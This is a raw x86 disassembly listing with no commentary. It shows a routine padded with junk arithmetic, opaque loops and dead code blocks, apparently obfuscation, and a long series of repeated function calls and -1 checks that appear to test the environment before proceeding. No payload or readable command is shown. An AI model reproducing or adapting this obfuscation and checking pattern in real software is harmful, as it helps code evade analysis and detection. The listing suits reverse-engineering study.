  423ab2:	push   edi
  423ab3:	call   DWORD PTR ds:0x42a3d2
  423ab9:	or     DWORD PTR ds:0x42a25a,0x42a2e6
  423ac3:	mov    DWORD PTR [esp+0x10],eax
  423ac7:	and    DWORD PTR ds:0x42a262,0x1b9a
  423ad1:	lea    eax,[esp+0x78]
  423ad5:	push   eax
  423ad6:	mov    DWORD PTR ds:0x42a2f6,0x43e8
  423ae0:	push   0x429542
  423ae5:	call   DWORD PTR ds:0x42a406
  423aeb:	mov    DWORD PTR ds:0x42a2ca,0x1192
  423af5:	cmp    eax,0xffffffff
  423af8:	mov    DWORD PTR ds:0x42a2ba,0x65ca
  423b02:	je     0x423b0f
  423b08:	xor    eax,eax
  423b0a:	jmp    0x424db4
  423b0f:	and    DWORD PTR ds:0x42a2e2,0x0
  423b19:	mov    esi,DWORD PTR ds:0x42a2e2
  423b1f:	inc    esi
  423b20:	mov    DWORD PTR ds:0x42a2e2,esi
  423b26:	cmp    DWORD PTR ds:0x42a2e2,0x23
  423b2d:	jle    0x423b6a
  423b33:	jmp    0x423b5d
  423b38:	push   0x42a2aa
  423b3d:	push   0x7608
  423b42:	push   0x7b9f
  423b47:	push   0x619c
  423b4c:	push   DWORD PTR [ebp-0x18]
  423b4f:	push   DWORD PTR [ebp-0x18]
  423b52:	push   0x2bb2
  423b57:	call   DWORD PTR ds:0x42a3ce
  423b5d:	cmp    DWORD PTR ds:0x42a2e2,0x15
  423b64:	jb     0x423b19
  423b6a:	mov    esi,DWORD PTR ds:0x42a3fe
  423b70:	push   0xf
  423b72:	lea    eax,[esp+0x44]
  423b76:	add    DWORD PTR ds:0x42a296,0x2da4
  423b80:	push   eax
  423b81:	adc    DWORD PTR ds:0x42a25a,0x42a2ce
  423b8b:	push   0x429556
  423b90:	sub    DWORD PTR ds:0x42a2ca,0x42a2b6
  423b9a:	push   0x42956a
  423b9f:	push   0x42958a
  423ba4:	sbb    DWORD PTR ds:0x42a2ae,0x7a6
  423bae:	call   esi
  423bb0:	adc    DWORD PTR ds:0x42a2ae,0x6000
  423bba:	imul   eax,eax,0x300000
  423bc0:	mov    DWORD PTR ds:0x42a256,0x5b4b
  423bca:	cmp    eax,0x1b00000
  423bcf:	mov    DWORD PTR ds:0x42a266,0x1101
  423bd9:	jne    0x423b08
  423bdf:	lea    eax,[esp+0x1b8]
  423be6:	sub    DWORD PTR ds:0x42a2c2,0x1046
  423bf0:	push   eax
  423bf1:	push   0x4295c6
  423bf6:	call   DWORD PTR ds:0x42a402
  423bfc:	mov    DWORD PTR ds:0x42a2a6,0x62e7
  423c06:	cmp    eax,0xffffffff
  423c09:	mov    DWORD PTR ds:0x42a292,0x7202
  423c13:	jne    0x423b08
  423c19:	push   DWORD PTR [esp+0x10]
  423c1d:	push   edi
  423c1e:	and    DWORD PTR ds:0x42a27e,0x42a262
  423c28:	call   DWORD PTR ds:0x42a3e6
  423c2e:	movzx  ecx,BYTE PTR ds:0x42a286
  423c35:	and    DWORD PTR ds:0x42a2a2,ecx
  423c3b:	mov    DWORD PTR [esp+0x30],edi
  423c3f:	sub    ecx,0x7aec
  423c45:	mov    DWORD PTR [esp+0x20],0xf89c85a5
  423c4d:	and    DWORD PTR ds:0x42a2be,0x0
  423c57:	jmp    0x423c6b
  423c5c:	xor    ebx,ebx
  423c5e:	xor    ebx,DWORD PTR ds:0x42a2be
  423c64:	inc    ebx
  423c65:	mov    DWORD PTR ds:0x42a2be,ebx
  423c6b:	cmp    DWORD PTR ds:0x42a2be,0x1c
  423c72:	jae    0x423cb6
  423c78:	cmp    DWORD PTR ds:0x42a2be,0x8
  423c7f:	jg     0x423cb6
  423c85:	jmp    0x423c95
  423c8a:	push   0x433e
  423c8f:	call   DWORD PTR ds:0x42a3d6
  423c95:	cmp    DWORD PTR ds:0x42a2be,0x7
  423c9c:	jne    0x423cb1
  423ca2:	xor    ebx,ebx
  423ca4:	xor    ebx,DWORD PTR ds:0x42a2be
  423caa:	inc    ebx
  423cab:	mov    DWORD PTR ds:0x42a2be,ebx
  423cb1:	jmp    0x423c5c
  423cb6:	mov    DWORD PTR [esp+0xc],0xf89c85ba
  423cbe:	lea    eax,[esp+0x3c]
  423cc2:	add    DWORD PTR ds:0x42a25a,ebx
  423cc8:	mov    DWORD PTR [esp+0x30],eax
  423ccc:	lea    eax,[esp+0x38]
  423cd0:	mov    DWORD PTR [esp+0x10],eax
  423cd4:	and    ecx,DWORD PTR ds:0x42a2aa
  423cda:	mov    eax,ds:0x42941e
  423cdf:	mov    DWORD PTR ds:0x42a2e6,0x11
  423ce9:	cmp    DWORD PTR ds:0x42a2e6,0x0
  423cf0:	je     0x423d45
  423cf6:	cmp    DWORD PTR ds:0x42a2e6,0x7
  423cfd:	jle    0x423d45
  423d03:	jmp    0x423d19
  423d08:	push   DWORD PTR [ebp-0x28]
  423d0b:	push   DWORD PTR [ebp-0x20]
  423d0e:	push   0x43b4
  423d13:	call   DWORD PTR ds:0x42a3da
  423d19:	cmp    DWORD PTR ds:0x42a2e6,0x8
  423d20:	jne    0x423d33
  423d26:	mov    ebx,DWORD PTR ds:0x42a2e6
  423d2c:	dec    ebx
  423d2d:	mov    DWORD PTR ds:0x42a2e6,ebx
  423d33:	mov    ebx,DWORD PTR ds:0x42a2e6
  423d39:	dec    ebx
  423d3a:	mov    DWORD PTR ds:0x42a2e6,ebx
  423d40:	jmp    0x423ce9
  423d45:	mov    eax,DWORD PTR [eax+0x1c8]
  423d4b:	movzx  ecx,BYTE PTR ds:0x42a29e
  423d52:	sub    DWORD PTR ds:0x42a286,ecx
  423d58:	mov    eax,DWORD PTR [eax]
  423d5a:	mov    ecx,DWORD PTR [esp+0x10]
  423d5e:	movzx  edi,WORD PTR ds:0x42a2b6
  423d65:	adc    DWORD PTR ds:0x42a2a6,edi
  423d6b:	mov    edi,0x75108aa
  423d70:	xor    eax,edi
  423d72:	or     DWORD PTR ds:0x42a2b2,0x565
  423d7c:	mov    ebx,0x3272f1
  423d81:	mov    DWORD PTR ds:0x42a272,0x78c3
  423d8b:	add    eax,ebx
  423d8d:	mov    DWORD PTR ds:0x42a2d2,0x2205
  423d97:	mov    DWORD PTR [ecx],eax
  423d99:	mov    eax,0x7be2
  423d9e:	mov    eax,ds:0x42a11a
  423da3:	cmp    eax,0x445cecf9
  423da8:	jne    0x423ea7
  423dae:	mov    DWORD PTR ds:0x42a2da,0x1f
  423db8:	cmp    DWORD PTR ds:0x42a2da,0x0
  423dbf:	je     0x423e1a
  423dc5:	cmp    DWORD PTR ds:0x42a2da,0x8
  423dcc:	ja     0x423e1a
  423dd2:	jmp    0x423df2
  423dd7:	push   DWORD PTR [ebp-0xc]
  423dda:	push   0x6d68
  423ddf:	push   0x65f4
  423de4:	push   DWORD PTR [ebp-0x1c]
  423de7:	push   0x42a292
  423dec:	call   DWORD PTR ds:0x42a3de
  423df2:	cmp    DWORD PTR ds:0x42a2da,0x9
  423df9:	jne    0x423e0a
  423dff:	mov    eax,ds:0x42a2da
  423e04:	dec    eax
  423e05:	mov    ds:0x42a2da,eax
  423e0a:	mov    eax,ds:0x42a2da
  423e0f:	dec    eax
  423e10:	mov    ds:0x42a2da,eax
  423e15:	jmp    0x423db8
  423e1a:	mov    eax,DWORD PTR [esp+0x20]
  423e1e:	mov    ecx,DWORD PTR ds:0x42941e
  423e24:	adc    DWORD PTR ds:0x42a272,0x42a276
  423e2e:	mov    ecx,DWORD PTR [ecx+0x198]
  423e34:	sub    DWORD PTR ds:0x42a266,0x3ba6
  423e3e:	xor    eax,edi
  423e40:	add    eax,ebx
  423e42:	sbb    DWORD PTR ds:0x42a286,0x42a266
  423e4c:	mov    DWORD PTR [ecx],eax
  423e4e:	xor    eax,0x20bc
  423e53:	mov    eax,DWORD PTR [esp+0x20]
  423e57:	adc    DWORD PTR ds:0x42a2d2,0x4876
  423e61:	xor    eax,edi
  423e63:	add    DWORD PTR ds:0x42a2e2,0x2a33
  423e6d:	add    eax,ebx
  423e6f:	mov    ds:0x42a11a,eax
  423e74:	movzx  eax,WORD PTR ds:0x42a29a
  423e7b:	sub    eax,DWORD PTR ds:0x42a2da
  423e81:	mov    ds:0x42a29a,eax
  423e86:	mov    eax,DWORD PTR [esp+0x20]
  423e8a:	and    DWORD PTR ds:0x42a292,0x51c2
  423e94:	xor    eax,edi
  423e96:	add    eax,ebx
  423e98:	or     DWORD PTR ds:0x42a2fa,0x2cb7
  423ea2:	mov    ds:0x429516,eax
  423ea7:	sbb    eax,0x6039
  423eac:	mov    eax,ds:0x42941e
  423eb1:	mov    eax,DWORD PTR [eax+0x18c]
  423eb7:	xor    DWORD PTR ds:0x42a2ca,0x42a2ce
  423ec1:	mov    eax,DWORD PTR [eax]
  423ec3:	add    DWORD PTR ds:0x42a2f6,0x42a29e
  423ecd:	mov    DWORD PTR [esp+0x60],eax
  423ed1:	and    DWORD PTR ds:0x42a26e,0x0
  423edb:	mov    eax,ds:0x42a26e
  423ee0:	inc    eax
  423ee1:	mov    ds:0x42a26e,eax
  423ee6:	cmp    DWORD PTR ds:0x42a26e,0x8
  423eed:	jb     0x423f2b
  423ef3:	jmp    0x423f06
  423ef8:	push   DWORD PTR [ebp-0x18]
  423efb:	push   0x42a2a6
  423f00:	call   DWORD PTR ds:0x42a40a
  423f06:	cmp    DWORD PTR ds:0x42a26e,0x7
  423f0d:	jne    0x423f1e
  423f13:	mov    eax,ds:0x42a26e
  423f18:	inc    eax
  423f19:	mov    ds:0x42a26e,eax
  423f1e:	cmp    DWORD PTR ds:0x42a26e,0x16
  423f25:	jb     0x423edb
  423f2b:	mov    eax,0xf89c85b9
  423f30:	and    DWORD PTR ds:0x42a25a,0x42a2ca
  423f3a:	mov    DWORD PTR [esp+0x18],eax
  423f3e:	mov    DWORD PTR [esp+0x18],eax
  423f42:	mov    DWORD PTR [esp+0x18],eax
  423f46:	sub    DWORD PTR ds:0x42a26e,0x2657
  423f50:	mov    DWORD PTR [esp+0x18],0xf89c85a5
  423f58:	mov    DWORD PTR [esp+0x10],eax
  423f5c:	mov    DWORD PTR [esp+0x10],0xf89c85bd
  423f64:	dec    DWORD PTR ds:0x42a2ba
  423f6a:	mov    eax,DWORD PTR [esp+0x20]
  423f6e:	xor    DWORD PTR ds:0x42a28a,0x42a2de
  423f78:	xor    eax,edi
  423f7a:	sbb    DWORD PTR ds:0x42a286,0xceb
  423f84:	add    eax,ebx
  423f86:	mov    DWORD PTR ds:0x42a2fe,0x5bbe
  423f90:	jmp    0x4240d4
  423f95:	lea    eax,[esp+0x78]
  423f99:	push   eax
  423f9a:	add    DWORD PTR ds:0x42a26a,0x42a266
  423fa4:	push   0x4295b2
  423fa9:	call   DWORD PTR ds:0x42a406
  423faf:	cmp    eax,0xffffffff
  423fb2:	mov    DWORD PTR ds:0x42a29a,0x7074
  423fbc:	jne    0x423b08
  423fc2:	push   0xf
  423fc4:	sub    DWORD PTR ds:0x42a2a6,0x5dcc
  423fce:	lea    eax,[esp+0x44]
  423fd2:	push   eax
  423fd3:	sbb    DWORD PTR ds:0x42a2d2,0x2005
  423fdd:	push   0x429606
  423fe2:	sub    DWORD PTR ds:0x42a2be,0x2b2b
  423fec:	push   0x42961a
  423ff1:	add    DWORD PTR ds:0x42a2f2,0x4bf9
  423ffb:	push   0x42963a
  424000:	call   esi
  424002:	imul   eax,eax,0x300000
  424008:	cmp    eax,0x1b00000
  42400d:	mov    DWORD PTR ds:0x42a2be,0x7b39
  424017:	jne    0x423b08
  42401d:	adc    DWORD PTR ds:0x42a29e,0x2f79
  424027:	lea    eax,[esp+0x1b8]
  42402e:	xor    DWORD PTR ds:0x42a26a,0x2364
  424038:	push   eax
  424039:	push   0x429676
  42403e:	call   DWORD PTR ds:0x42a402
  424044:	mov    DWORD PTR ds:0x42a27e,0x2c82
  42404e:	cmp    eax,0xffffffff
  424051:	mov    DWORD PTR ds:0x42a2fa,0x479f
  42405b:	jne    0x423b08
  424061:	mov    eax,DWORD PTR [esp+0xc]
  424065:	mov    ecx,DWORD PTR [esp+0x10]
  424069:	xor    eax,edi
  42406b:	add    DWORD PTR ds:0x42a29a,0x71aa
  424075:	lea    eax,[eax+ecx*1+0x3272f1]
  42407c:	adc    DWORD PTR ds:0x42a2c6,0x42a292
  424086:	push   eax
  424087:	mov    eax,DWORD PTR [esp+0x1c]
  42408b:	or     DWORD PTR ds:0x42a2fa,0x259a
  424095:	xor    eax,edi
  424097:	lea    eax,[ebp+eax*1+0x3272f9]
  42409e:	push   eax
  42409f:	xor    DWORD PTR ds:0x42a2aa,0x66c
  4240a9:	mov    eax,ds:0x42941e
  4240ae:	push   DWORD PTR [eax+0x1bc]
  4240b4:	and    DWORD PTR ds:0x42a2ce,0x42a27e
  4240be:	call   0x424dbd
  4240c3:	mov    eax,DWORD PTR [esp+0xc]
  4240c7:	mov    ecx,DWORD PTR [esp+0x10]
  4240cb:	xor    eax,edi
  4240cd:	lea    eax,[ecx+eax*1+0x3272f1]
  4240d4:	mov    ecx,DWORD PTR [esp+0xc]
  4240d8:	mov    DWORD PTR ds:0x42a2ea,0x12
  4240e2:	cmp    DWORD PTR ds:0x42a2ea,0x0
  4240e9:	je     0x424139
  4240ef:	cmp    DWORD PTR ds:0x42a2ea,0x2
  4240f6:	jbe    0x424139
  4240fc:	jmp    0x42410d
  424101:	push   DWORD PTR [ebp-0x24]
  424104:	push   DWORD PTR [ebp-0x14]
  424107:	call   DWORD PTR ds:0x42a3e2
  42410d:	cmp    DWORD PTR ds:0x42a2ea,0x3
  424114:	jne    0x424127
  42411a:	mov    edx,DWORD PTR ds:0x42a2ea
  424120:	dec    edx
  424121:	mov    DWORD PTR ds:0x42a2ea,edx
  424127:	mov    edx,DWORD PTR ds:0x42a2ea
  42412d:	dec    edx
  42412e:	mov    DWORD PTR ds:0x42a2ea,edx
  424134:	jmp    0x4240e2
  424139:	mov    edx,DWORD PTR [esp+0xc]
  42413d:	and    DWORD PTR ds:0x42a2e6,0x42a2a2
  424147:	xor    edx,edi
  424149:	xor    ecx,edi
  42414b:	adc    DWORD PTR ds:0x42a28a,0x42a2b6
  424155:	add    ecx,edx
  424157:	mov    edx,DWORD PTR ds:0x42a2ce
  42415d:	sbb    edx,DWORD PTR ds:0x42a2e2
  424163:	mov    DWORD PTR ds:0x42a2ce,edx
  424169:	mov    edx,DWORD PTR [esp+0xc]
  42416d:	xor    edx,edi
  42416f:	mov    DWORD PTR ds:0x42a27e,0x2a3d
  424179:	lea    ecx,[ecx+edx*1+0x9758d3]
  424180:	mov    DWORD PTR [esp+0x10],eax
  424184:	mov    DWORD PTR ds:0x42a2fa,0x2809
  42418e:	cmp    eax,ecx
  424190:	mov    DWORD PTR ds:0x42a28a,0x80a
  42419a:	jbe    0x423f95
  4241a0:	adc    DWORD PTR ds:0x42a28a,ebx
  4241a6:	mov    eax,DWORD PTR [ebp+0xc]
  4241a9:	add    DWORD PTR ds:0x42a2be,ebx
  4241af:	mov    ds:0x4292a2,eax
  4241b4:	mov    DWORD PTR ds:0x42a2be,0x1e
  4241be:	cmp    DWORD PTR ds:0x42a2be,0x0
  4241c5:	je     0x424216
  4241cb:	cmp    DWORD PTR ds:0x42a2be,0xc
  4241d2:	jbe    0x424216
  4241d8:	jmp    0x4241ee
  4241dd:	push   DWORD PTR [ebp-0xc]
  4241e0:	push   DWORD PTR [ebp-0x10]
  4241e3:	push   0x658e
  4241e8:	call   DWORD PTR ds:0x42a40e
  4241ee:	cmp    DWORD PTR ds:0x42a2be,0xd
  4241f5:	jne    0x424206
  4241fb:	mov    eax,ds:0x42a2be
  424200:	dec    eax
  424201:	mov    ds:0x42a2be,eax
  424206:	mov    eax,ds:0x42a2be
  42420b:	dec    eax
  42420c:	mov    ds:0x42a2be,eax
  424211:	jmp    0x4241be
  424216:	mov    eax,DWORD PTR [ebp+0x10]
  424219:	mov    DWORD PTR ds:0x42a2aa,0x11
  424223:	cmp    DWORD PTR ds:0x42a2aa,0x0
  42422a:	je     0x424265
  424230:	cmp    DWORD PTR ds:0x42a2aa,0x12
  424237:	ja     0x424265
  42423d:	jmp    0x424253
  424242:	push   DWORD PTR [ebp-0x1c]
  424245:	push   DWORD PTR [ebp-0x10]
  424248:	push   0x1d56
  42424d:	call   DWORD PTR ds:0x42a412
  424253:	mov    ecx,DWORD PTR ds:0x42a2aa
  424259:	dec    ecx
  42425a:	mov    DWORD PTR ds:0x42a2aa,ecx
  424260:	jmp    0x424223
  424265:	mov    ds:0x4294fe,eax
  42426a:	or     DWORD PTR ds:0x42a2d2,ecx
  424270:	mov    eax,ds:0x4292a2
  424275:	mov    ecx,DWORD PTR [esp+0x30]
  424279:	sub    eax,ebx
  42427b:	xor    eax,edi
  42427d:	mov    DWORD PTR [ecx],eax
  42427f:	adc    DWORD PTR ds:0x42a2fe,0x42a2de
  424289:	lea    eax,[esp+0x2c]
  42428d:	sbb    DWORD PTR ds:0x42a2aa,0x42a2be
  424297:	mov    DWORD PTR [esp+0x6c],eax
  42429b:	lea    eax,[ebp+0x4]
  42429e:	mov    DWORD PTR [esp+0x2c],eax
  4242a2:	lea    eax,[esp+0x78]
  4242a6:	push   eax
  4242a7:	sub    DWORD PTR ds:0x42a2ea,0x42a286
  4242b1:	push   0x429662
  4242b6:	call   DWORD PTR ds:0x42a406
  4242bc:	cmp    eax,0xffffffff
  4242bf:	mov    DWORD PTR ds:0x42a2f2,0x2a21
  4242c9:	jne    0x423b08
  4242cf:	push   0xf
  4242d1:	sub    DWORD PTR ds:0x42a29e,0x42a2a6
  4242db:	lea    eax,[esp+0x44]
  4242df:	xor    DWORD PTR ds:0x42a27a,0x6f67
  4242e9:	push   eax
  4242ea:	push   0x4296b6
  4242ef:	add    DWORD PTR ds:0x42a29e,0xde7
  4242f9:	push   0x4296ca
  4242fe:	adc    DWORD PTR ds:0x42a2da,0x42a266
  424308:	push   0x4296ea
  42430d:	call   esi
  42430f:	mov    DWORD PTR ds:0x42a29e,0x79ec
  424319:	imul   eax,eax,0x300000
  42431f:	mov    DWORD PTR ds:0x42a286,0x463d
  424329:	cmp    eax,0x1b00000
  42432e:	jne    0x423b08
  424334:	lea    eax,[esp+0x1b8]
  42433b:	and    DWORD PTR ds:0x42a2be,0x42a2ae
  424345:	push   eax
  424346:	adc    DWORD PTR ds:0x42a2fa,0x42a2aa
  424350:	push   0x429726
  424355:	xor    DWORD PTR ds:0x42a2ca,0x42a25a
  42435f:	call   DWORD PTR ds:0x42a402
  424365:	mov    DWORD PTR ds:0x42a272,0x4e57
  42436f:	cmp    eax,0xffffffff
  424372:	mov    DWORD PTR ds:0x42a302,0x1bd9
  42437c:	jne    0x423b08
  424382:	or     DWORD PTR ds:0x42a2fe,0x42a2e2
  42438c:	lea    eax,[esp+0x78]
  424390:	sub    DWORD PTR ds:0x42a25e,0x6538
  42439a:	push   eax
  42439b:	add    DWORD PTR ds:0x42a2ae,0x42a2fe
  4243a5:	push   0x429712
  4243aa:	call   DWORD PTR ds:0x42a406
  4243b0:	mov    DWORD PTR ds:0x42a2ee,0x1cd6
  4243ba:	cmp    eax,0xffffffff
  4243bd:	mov    DWORD PTR ds:0x42a2c2,0x32c8
  4243c7:	jne    0x423b08
  4243cd:	push   0xf
  4243cf:	lea    eax,[esp+0x44]
  4243d3:	xor    DWORD PTR ds:0x42a29e,0x42a2a6
  4243dd:	push   eax
  4243de:	push   0x429766
  4243e3:	adc    DWORD PTR ds:0x42a29e,0x7895
  4243ed:	push   0x42977a
  4243f2:	push   0x42979a
  4243f7:	call   esi
  4243f9:	imul   eax,eax,0x300000
  4243ff:	cmp    eax,0x1b00000
  424404:	jne    0x423b08
  42440a:	lea    eax,[esp+0x1b8]
  424411:	push   eax
  424412:	push   0x4297d6
  424417:	sub    DWORD PTR ds:0x42a2ca,0x42a296
  424421:	call   DWORD PTR ds:0x42a402
  424427:	mov    DWORD PTR ds:0x42a292,0x3d95
  424431:	cmp    eax,0xffffffff
  424434:	mov    DWORD PTR ds:0x42a28a,0x79ad
  42443e:	jne    0x423b08
  424444:	lea    eax,[esp+0x78]
  424448:	add    DWORD PTR ds:0x42a25a,0x6022
  424452:	push   eax
  424453:	neg    DWORD PTR ds:0x42a28a
  424459:	push   0x4297c2
  42445e:	add    DWORD PTR ds:0x42a286,0x42a2f2
  424468:	call   DWORD PTR ds:0x42a406
  42446e:	mov    DWORD PTR ds:0x42a27a,0x4f36
  424478:	cmp    eax,0xffffffff
  42447b:	mov    DWORD PTR ds:0x42a2a2,0x71f8
  424485:	jne    0x423b08
  42448b:	xor    DWORD PTR ds:0x42a2c2,0x540c
  424495:	push   0xf
  424497:	or     DWORD PTR ds:0x42a256,0x42a276
  4244a1:	lea    eax,[esp+0x44]
  4244a5:	and    DWORD PTR ds:0x42a2b6,0x3361
  4244af:	push   eax
  4244b0:	sub    DWORD PTR ds:0x42a2c6,0x5c7b
  4244ba:	push   0x429816
  4244bf:	adc    DWORD PTR ds:0x42a2b6,0x42a2da
  4244c9:	push   0x42982a
  4244ce:	xor    DWORD PTR ds:0x42a28e,0x42a2c2
  4244d8:	push   0x42984a
  4244dd:	or     DWORD PTR ds:0x42a2ba,0x42a2da
  4244e7:	call   esi
  4244e9:	imul   eax,eax,0x300000
  4244ef:	mov    DWORD PTR ds:0x42a262,0x112c
  4244f9:	cmp    eax,0x1b00000
  4244fe:	jne    0x423b08
  424504:	or     DWORD PTR ds:0x42a25a,0x1a1c
  42450e:	lea    eax,[esp+0x1b8]
  424515:	push   eax
  424516:	sub    DWORD PTR ds:0x42a2f6,0xb4e
  424520:	push   0x429886
  424525:	not    DWORD PTR ds:0x42a25e
  42452b:	call   DWORD PTR ds:0x42a402
  424531:	mov    DWORD PTR ds:0x42a2e2,0x34b9
  42453b:	cmp    eax,0xffffffff
  42453e:	mov    DWORD PTR ds:0x42a2c6,0x68d6
  424548:	jne    0x423b08
  42454e:	lea    eax,[esp+0x78]
  424552:	push   eax
  424553:	sub    DWORD PTR ds:0x42a2b2,0x42a28e
  42455d:	push   0x429872
  424562:	sub    DWORD PTR ds:0x42a2aa,0xfe
  42456c:	call   DWORD PTR ds:0x42a406
  424572:	mov    DWORD PTR ds:0x42a2ae,0x162e
  42457c:	cmp    eax,0xffffffff
  42457f:	jne    0x423b08
  424585:	add    DWORD PTR ds:0x42a29a,0x39d
  42458f:	push   0xf
  424591:	lea    eax,[esp+0x44]
  424595:	push   eax
  424596:	sbb    DWORD PTR ds:0x42a2ea,0x4c8c
  4245a0:	push   0x4298c6
  4245a5:	push   0x4298da
  4245aa:	push   0x4298fa
  4245af:	call   esi
  4245b1:	sub    DWORD PTR ds:0x42a25a,0x42a26e
  4245bb:	imul   eax,eax,0x300000
  4245c1:	mov    DWORD PTR ds:0x42a296,0x5962
  4245cb:	cmp    eax,0x1b00000
  4245d0:	jne    0x423b08
  4245d6:	add    DWORD PTR ds:0x42a2ae,0x42a2d6
  4245e0:	lea    eax,[esp+0x1b8]
  4245e7:	or     DWORD PTR ds:0x42a2b6,0x4619
  4245f1:	push   eax
  4245f2:	push   0x429936
  4245f7:	and    DWORD PTR ds:0x42a27a,0x42a2fa
  424601:	call   DWORD PTR ds:0x42a402
  424607:	mov    DWORD PTR ds:0x42a2fa,0x2004
  424611:	cmp    eax,0xffffffff
  424614:	mov    DWORD PTR ds:0x42a296,0x62c6
  42461e:	jne    0x423b08
  424624:	and    DWORD PTR ds:0x42a2de,0x5eb4
  42462e:	lea    eax,[esp+0x78]
  424632:	adc    DWORD PTR ds:0x42a28a,0x4918
  42463c:	push   eax
  42463d:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  424647:	push   0x429922
  42464c:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  424656:	call   DWORD PTR ds:0x42a406
  42465c:	mov    DWORD PTR ds:0x42a25a,0x13e7
  424666:	cmp    eax,0xffffffff
  424669:	mov    DWORD PTR ds:0x42a2da,0xa62
  424673:	jne    0x423b08
  424679:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  424683:	push   0xf
  424685:	lea    eax,[esp+0x44]
  424689:	or     DWORD PTR ds:0x42a2be,0x2cef
  424693:	push   eax
  424694:	push   0x429976
  424699:	push   0x42998a
  42469e:	sub    DWORD PTR ds:0x42a2ae,0x42a29a
  4246a8:	push   0x4299aa
  4246ad:	call   esi
  4246af:	imul   eax,eax,0x300000
  4246b5:	mov    DWORD PTR ds:0x42a29e,0x43ec
  4246bf:	cmp    eax,0x1b00000
  4246c4:	mov    DWORD PTR ds:0x42a2d2,0x18cb
  4246ce:	jne    0x423b08
  4246d4:	add    DWORD PTR ds:0x42a2ba,0x5057
  4246de:	lea    eax,[esp+0x1b8]
  4246e5:	or     DWORD PTR ds:0x42a2ce,0x48df
  4246ef:	push   eax
  4246f0:	and    DWORD PTR ds:0x42a2ee,0x7c0c
  4246fa:	push   0x4299e6
  4246ff:	and    DWORD PTR ds:0x42a302,0x42a2e2
  424709:	call   DWORD PTR ds:0x42a402
  42470f:	cmp    eax,0xffffffff
  424712:	jne    0x423b08
  424718:	or     DWORD PTR ds:0x42a2d6,0x5541
  424722:	lea    eax,[esp+0x78]
  424726:	sub    DWORD PTR ds:0x42a302,0x686a
  424730:	push   eax
  424731:	xor    DWORD PTR ds:0x42a2fa,0x42a2f6
  42473b:	push   0x4299d2
  424740:	add    DWORD PTR ds:0x42a2c6,0x4894
  42474a:	call   DWORD PTR ds:0x42a406
  424750:	mov    DWORD PTR ds:0x42a256,0x5d36
  42475a:	cmp    eax,0xffffffff
  42475d:	mov    DWORD PTR ds:0x42a296,0x63d2
  424767:	jne    0x423b08
  42476d:	adc    DWORD PTR ds:0x42a2de,0x6d
  424777:	push   0xf
  424779:	xor    DWORD PTR ds:0x42a2ea,0x42a2be
  424783:	lea    eax,[esp+0x44]
  424787:	xor    DWORD PTR ds:0x42a25a,0x245a
  424791:	push   eax
  424792:	adc    DWORD PTR ds:0x42a26a,0x29d1
  42479c:	push   0x429a26
  4247a1:	push   0x429a3a
  4247a6:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  4247b0:	push   0x429a5a
  4247b5:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  4247bf:	call   esi
  4247c1:	imul   eax,eax,0x300000
  4247c7:	cmp    eax,0x1b00000
  4247cc:	jne    0x423b08
  4247d2:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  4247dc:	lea    eax,[esp+0x1b8]
  4247e3:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  4247ed:	push   eax
  4247ee:	not    DWORD PTR ds:0x42a25e
  4247f4:	push   0x429a96
  4247f9:	call   DWORD PTR ds:0x42a402
  4247ff:	mov    DWORD PTR ds:0x42a2f2,0x183e
  424809:	cmp    eax,0xffffffff
  42480c:	jne    0x423b08
  424812:	lea    eax,[esp+0x78]
  424816:	xor    DWORD PTR ds:0x42a2e2,0x57b8
  424820:	push   eax
  424821:	push   0x429a82
  424826:	add    DWORD PTR ds:0x42a2ba,0x1e81
  424830:	call   DWORD PTR ds:0x42a406
  424836:	mov    DWORD PTR ds:0x42a2ce,0x328a
  424840:	cmp    eax,0xffffffff
  424843:	mov    DWORD PTR ds:0x42a302,0x13f0
  42484d:	jne    0x423b08
  424853:	push   0xf
  424855:	lea    eax,[esp+0x44]
  424859:	adc    DWORD PTR ds:0x42a2ce,0x42a27e
  424863:	push   eax
  424864:	xor    DWORD PTR ds:0x42a2da,0x725b
  42486e:	push   0x429ad6
  424873:	adc    DWORD PTR ds:0x42a2c6,0x39d7
  42487d:	push   0x429aea
  424882:	xor    DWORD PTR ds:0x42a296,0x42a2b2
  42488c:	push   0x429b0a
  424891:	call   esi
  424893:	adc    DWORD PTR ds:0x42a2b6,0x42a302
  42489d:	imul   eax,eax,0x300000
  4248a3:	cmp    eax,0x1b00000
  4248a8:	jne    0x423b08
  4248ae:	lea    eax,[esp+0x1b8]
  4248b5:	push   eax
  4248b6:	push   0x429b46
  4248bb:	call   DWORD PTR ds:0x42a402
  4248c1:	cmp    eax,0xffffffff
  4248c4:	jne    0x423b08
  4248ca:	lea    eax,[esp+0x78]
  4248ce:	push   eax
  4248cf:	push   0x429b32
  4248d4:	call   DWORD PTR ds:0x42a406
  4248da:	cmp    eax,0xffffffff
  4248dd:	jne    0x423b08
  4248e3:	push   0xf
  4248e5:	lea    eax,[esp+0x44]
  4248e9:	push   eax
  4248ea:	push   0x429b86
  4248ef:	push   0x429b9a
  4248f4:	push   0x429bba
  4248f9:	call   esi
  4248fb:	imul   eax,eax,0x300000
  424901:	cmp    eax,0x1b00000
  424906:	jne    0x423b08
  42490c:	lea    eax,[esp+0x1b8]
  424913:	push   eax
  424914:	push   0x429bf6
  424919:	call   DWORD PTR ds:0x42a402
  42491f:	cmp    eax,0xffffffff
  424922:	jne    0x423b08
  424928:	lea    eax,[esp+0x78]
  42492c:	push   eax
  42492d:	push   0x429be2
  424932:	call   DWORD PTR ds:0x42a406
  424938:	cmp    eax,0xffffffff
  42493b:	jne    0x423b08
  424941:	push   0xf
  424943:	lea    eax,[esp+0x44]
  424947:	push   eax
  424948:	push   0x429c36
  42494d:	push   0x429c4a
  424952:	push   0x429c6a
  424957:	call   esi
  424959:	imul   eax,eax,0x300000
  42495f:	cmp    eax,0x1b00000
  424964:	jne    0x423b08
  42496a:	lea    eax,[esp+0x1b8]
  424971:	push   eax
  424972:	push   0x429ca6
  424977:	call   DWORD PTR ds:0x42a402
  42497d:	cmp    eax,0xffffffff
  424980:	jne    0x423b08
  424986:	lea    eax,[esp+0x78]
  42498a:	push   eax
  42498b:	push   0x429c92
  424990:	call   DWORD PTR ds:0x42a406
  424996:	cmp    eax,0xffffffff
  424999:	jne    0x423b08
  42499f:	push   0xf
